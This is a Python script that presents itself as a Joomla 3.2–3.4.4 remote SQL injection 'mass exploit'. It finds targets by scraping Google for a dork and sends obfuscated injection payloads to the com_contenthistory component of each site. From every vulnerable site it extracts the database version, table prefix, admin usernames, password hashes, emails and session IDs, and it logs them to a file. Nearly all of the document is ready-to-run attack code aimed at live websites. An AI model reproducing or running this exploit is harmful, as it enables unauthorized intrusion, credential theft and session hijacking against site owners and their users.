# Joomla 3.2 to 3.4.4 Remote SQL Injection Mass Exploit
# Thx to: Mukarram Khalid
# by 4Wsec - Anon Cyber Team
# https://github.com/aryanrtm/joom0day
# Twitter: @4wsec_
# Contact: 4wsec@cyberservices.com

from    urllib.parse import urlparse
from    time         import time as timer
import  requests, re, sys
from    functools import partial
from    multiprocessing import Pool

# Dorking euy

def get_urls(search_string, start):
    temp        = []
    url         = 'https://www.google.com/search'
    payload     = { 'q' : search_string, 'start' : start , 'num' : '100' }
    # Set Cookies in my_headers from your browser, in case it doesn't get any results.
    my_headers  = { 'User-Agent' : 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0', 'Cookie' : '' }
    r           = requests.get( url, params = payload, headers = my_headers )
    # print( r.text.encode('utf-8') )
    temp.extend( re.findall( '<h3 class="r"><a href="(.+?)"', r.text ) )
    # print(temp)
    return temp

def dork_scanner(search, pages, processes):
    result      = []
    search      = search
    pages       = pages
    processes   = int( processes )
    make_request = partial( get_urls, search )
    pagelist     = [ str(x*100) for x in range( 0, int(pages) ) ]
    with Pool(processes) as p:
        tmp = p.map(make_request, pagelist)
    for x in tmp:
        result.extend(x)
    result = list( set( result ) )
    return result

# Dorking selesai

def banner():
    print( '\n\n' )
    print('      ██╗ ██████╗  ██████╗ ███╗   ███╗     ██████╗ ██████╗  █████╗ ██╗   ██╗ ' )
    print('      ██║██╔═══██╗██╔═══██╗████╗ ████║    ██╔═████╗██╔══██╗██╔══██╗╚██╗ ██╔╝ ' )
    print('      ██║██║   ██║██║   ██║██╔████╔██║    ██║██╔██║██║  ██║███████║ ╚████╔╝  ' )
    print(' ██   ██║██║   ██║██║   ██║██║╚██╔╝██║    ████╔╝██║██║  ██║██╔══██║  ╚██╔╝   ' )
    print(' ╚█████╔╝╚██████╔╝╚██████╔╝██║ ╚═╝ ██║    ╚██████╔╝██████╔╝██║  ██║   ██║    ' )
    print('  ╚════╝  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝     ╚═════╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝    ' )
    print('     Joom 0day - Joomla 3.2 to 3.4.4 Remote SQL Injection Mass Exploit')
    print('                          by 4WSec - Anon Cyber Team')
    print ('                          Thx to: Mukarram Khalid')
    print( '\n' )

def inject( u ):
    tblprefix   = ''
    username    = ''
    password    = ''
    email       = ''
    session_id  = ''
    #Payload untuk version() and user()
    payload1    = { 'option' : 'com_contenthistory', 'view' : 'history', 'list[ordering]' : '' , 'item_id' : '', 'type_id' : '', 'list[select]' : 'polygon((/*!00000select*/*/*!00000from*/(/*!00000select*/*/*!00000from*/(/*!00000select*/concat_ws(0x7e3a,0x6d616b6d616e,version(),user())as mk)``)``))' }
    #Payload untuk table prefix
    payload2    = { 'option' : 'com_contenthistory', 'view' : 'history', 'list[ordering]' : '' , 'item_id' : '', 'type_id' : '', 'list[select]' : 'polygon((/*!00000select*/*/*!00000from*/(/*!00000select*/*/*!00000from*/(/*!00000select*/concat_ws(0x7e3a,0x6d616b6d616e,(/*!00000select*//*!00000table_name*//*!00000from*//*!00000information_schema*/.tables/*!00000where*/table_schema=database() and/*!00000table_name*/like 0x25636f6e74656e745f7479706573 limit 0,1))as mk)``)``))' }
    #Formating untuk URL properly
    o           = urlparse(u)
    url         = o.scheme + '://' + o.netloc + '/index.php'
    try:
        r   = requests.get( url, params = payload1, timeout= 15 )
        if 'act~:' in r.text:
            iresult = re.search( "act~:(.+?)'", r.text ).group(1)
            r = requests.get( url, params = payload2, timeout= 15 )
            if 'act~:' in r.text:
                tresult = re.search( "act~:(.+?)'", r.text ).group(1)
                tblprefix = tresult.replace('content_types', '')
                payload3 = { 'option' : 'com_contenthistory', 'view' : 'history', 'list[ordering]' : '' , 'item_id' : '', 'type_id' : '', 'list[select]' : 'polygon((/*!00000select*/*/*!00000from*/(/*!00000select*/*/*!00000from*/(/*!00000select*/concat_ws(0x7e3a,(/*!00000select*/concat_ws(0x7e3a,0x6d616b6d616e,username,password,email) /*!00000from*/' + tblprefix + 'users order by id ASC limit 0,1),(/*!00000select*/session_id /*!00000from*/' + tblprefix + 'session order by time DESC limit 0,1))as mk)``)``))' }
                r = requests.get( url, params = payload3, timeout= 15 )
                if 'act~:' in r.text:
                    fresult     = re.search( "act~:(.+?)'", r.text ).group(1)
                    username    = fresult.split('~:')[0]
                    password    = fresult.split('~:')[1]
                    email       = fresult.split('~:')[2]
                    session_id  = fresult.split('~:')[3]
            print ( '------------------------------------------------\n'  )
            print ( '[+] Url        : '      + url                        )
            print ( '[+] User       : '      + iresult.split('~:')[1]     )
            print ( '[+] Version    : '      + iresult.split('~:')[0]     )
            print ( '[+] tbl_prefix : '      + tblprefix                  )
            print ( '[+] Username   : '      + username                   )
            print ( '[+] Password   : '      + password                   )
            print ( '[+] Email      : '      + email                      )
            print ( '[+] Session Id : '      + session_id                 )
            print ( '\n------------------------------------------------\n')
            sys.stdout.flush()
            return url + '~:' + iresult + '~:' + tblprefix + '~:' + username + '~:' + password + '~:' + email + '~:' + session_id
        else:
            return url + '~:' + 'Not Vulnerable'
    except:
        return url + '~:' + 'Bad Response'

def main():
    banner()
    start         = timer()
    dork          = 'inurl:"/component/tags/"'
    file_string   = '###By 4WSec###\n'
    final_result  = []
    count         = 0
    print( '[+] Starting dork scanner for : ' + dork)
    sys.stdout.flush()
    # Memanggil dork scanner
    search_result = dork_scanner( dork, '6', '6' )
    print( '[+] Total URLs found : ' + str( len( search_result ) ) )
    with open( 'urls.txt', 'a', encoding = 'utf-8' ) as ufile:
        ufile.write( '\n'.join( search_result ) )
    print( '[+] URLs written to urls.txt' )
    print( '\n[+] Trying Joomla SQL Injection exploit on ' + str( len( search_result ) ) + ' urls' )
    sys.stdout.flush()
    #Running 8 parallel processes for the exploitation
    with Pool(8) as p:
        final_result.extend( p.map( inject, search_result ) )
    for i in final_result:
        if not 'Not Vulnerable' in i and not 'Bad Response' in i:
            count += 1
            file_string = file_string + i.split('~:')[0] + '\n' + i.split('~:')[1] + '\n' + i.split('~:')[2] + '\n' + i.split('~:')[3] + '\n' + i.split('~:')[4] + '\n' + i.split('~:')[5] + '\n' + i.split('~:')[6] + '\n\n\n'
    #Writing vulnerable URLs in a file act.txt
    with open( 'act.txt', 'a', encoding = 'utf-8' ) as rfile:
        rfile.write( file_string )
    print( 'Total URLs Scanned    : ' + str( len( search_result ) ) )
    print( 'Vulnerable URLs Found : ' + str( count ) )
    print( 'Script Execution Time : ' + str ( timer() - start ) + ' seconds' )

if __name__ == '__main__':
    main()


# FUCK YOU
